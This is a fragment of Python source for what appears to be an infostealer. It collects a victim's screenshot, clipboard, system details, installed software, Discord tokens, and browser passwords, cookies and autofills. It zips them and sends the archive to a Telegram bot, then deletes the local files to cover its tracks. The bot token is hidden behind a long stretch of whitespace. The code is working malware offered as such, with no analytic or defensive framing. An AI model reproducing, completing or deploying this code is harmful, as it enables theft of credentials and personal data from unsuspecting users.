                    try:
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            writer.write(f"{name}\n")
                    except FileNotFoundError:
                        continue
        except FileNotFoundError:
            continue

    writer.write("└─────────────────────────────────────────────────────────\n")

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= BUILD LOG ============================================================================================================ #
with zipfile.ZipFile(log_file, "w") as zip_file:
    zip_file.write(f"{installation_folder}\\desktop.png", arcname="desktop.png")
    zip_file.write(f"{installation_folder}\\clipboard.txt", arcname="clipboard.txt")
    zip_file.write(f"{installation_folder}\\computer.txt", arcname="computer.txt")
    zip_file.write(f"{installation_folder}\\tasklist.txt", arcname="tasklist.txt")
    zip_file.write(f"{installation_folder}\\startup.txt", arcname="startup.txt")
    AddFolderToZip(zip_file, discord_info, arcBase="Discord")
    AddFolderToZip(zip_file, chromium_info, arcBase="Chromium Browsers")
    AddFolderToZip(zip_file, softwares_info, arcBase="Softwares")
    AddFolderToZip(zip_file, firefox_info, arcBase="Firefox")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= SEND DATA ============================================================================================================ #
if not debug:
    channel_id = "-1002458809139"                                                                                                                                                                                                                                                                                                                                                             ;bot = "7931282619:AAHWAkGZRWJcRLI81QMacRFSnc0_ddvRK9E"
    message = f"""
    <u><b>System Infos :</b></u>
    👤 Session Name: {session}
    👥 Computer Name: {computer_name}
    💻 OS: {os_version}
    🛠 Architecture: {architecture}
    📡 MAC: {mac}
    📌 IP: {ip}
    🌍 Country: {country}

    <u><b>Available Infos :</b></u>
    🔵 Discord Account: {total_discord_token}
    ⌨ Passwords: {total_passwords}
    📑 Auto-fills: {total_autofills}
    🍪 Cookies: {total_cookies}"""

    url = f"https://api.telegram.org/bot{bot}/sendDocument"
    with open(log_file, "rb") as file:
        files = {"document": file}
        data = {"chat_id": channel_id, "caption": message, "parse_mode": "HTML"}
        res = requests.post(url, data=data, files=files)

    Sys.Remove(log_file)
    Sys.Remove(f"{installation_folder}\\desktop.png")
    Sys.Remove(f"{installation_folder}\\clipboard.txt")
    Sys.Remove(f"{installation_folder}\\computer.txt")
    Sys.Remove(f"{installation_folder}\\startup.txt")
    Sys.Remove(f"{installation_folder}\\tasklist.txt")
    shutil.rmtree(discord_info)
    shutil.rmtree(softwares_info)
    shutil.rmtree(chromium_info)
    shutil.rmtree(firefox_info)
    shutil.rmtree(accounts_info)
